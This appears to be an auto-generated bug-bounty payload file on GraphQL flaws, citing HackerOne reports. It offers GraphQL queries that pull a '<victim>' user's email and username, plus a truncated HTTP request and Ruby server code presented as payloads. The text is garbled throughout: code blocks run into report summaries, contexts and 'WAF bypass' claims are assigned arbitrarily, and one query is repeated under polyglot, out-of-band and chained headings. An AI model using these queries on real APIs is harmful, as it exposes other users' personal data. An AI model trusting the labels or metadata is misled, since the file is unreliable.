---
vuln_type: "GraphQL"
file_type: "payloads"
total_reports: "62"
avg_bounty: "0"
max_bounty: "0"
severity_distribution: "critical:0% high:0% medium:0% low:100%"
owasp_categories: ["A00:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["GraphQL", "web", "api", "A00", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---


# GraphQL — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.

> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1000567](https://hackerone.com/reports/1000567)

#### Payload 2

```javascript
POST /graphql HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 168
accept: */*
X-Auth-Token: your_token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
content-type:... This report describes a GraphQL issue affecting the target application surface. The disclosed finding is titled "Disclosure handle private program..." and indicates exploitable input handling weaknesses. Observed report context: **Summary:** Hi team. It looks like we can identify private programs that have an external link ### Steps To Reproduce 1.
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1023669](https://hackerone.com/reports/1023669)

## Context-Specific Payloads

#### Payload 3

```javascript
def resolve(id:)
        snippet = authorized_find!(id: id)

        response = ::Snippets::DestroyService.new(current_user, snippet).execute
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1044869](https://hackerone.com/reports/1044869)

## Advanced Payloads

#### Payload 4

```javascript
module Mutations
  module Metrics
    module Dashboard
      module Annotations
        class Base < BaseMutation
          private

          # This method is defined here in order to be used by `authorized_find!` in the... This report describes a GraphQL issue affecting the target application surface. The disclosed finding is titled "Insufficient Type Check leading to..." and indicates exploitable input handling weaknesses. Observed report context: ### Summary Similar bug to #858671, but this time with annotations mutation: `DeleteAnnotation` in ***app/graphql/mutations/metrics/dashboard/annotations/base.rb***
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1084892](https://hackerone.com/reports/1084892)

## WAF Bypass Payloads

#### Payload 1

```javascript
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1000567](https://hackerone.com/reports/1000567)

## Encoding & Obfuscation

#### Payload 5

```javascript
query { user(username:"<victim>"){ email username } }
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1084904](https://hackerone.com/reports/1084904)

## Polyglot Payloads

#### Payload 1

```javascript
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1000567](https://hackerone.com/reports/1000567)

## Blind / Out-of-Band Payloads

#### Payload 1

```javascript
query {
  user(username:"<victim>"){
    email
    username
  }
}
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1000567](https://hackerone.com/reports/1000567)

## Chained Payloads

#### Payload 5

```javascript
query { user(username:"<victim>"){ email username } }
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1084904](https://hackerone.com/reports/1084904)

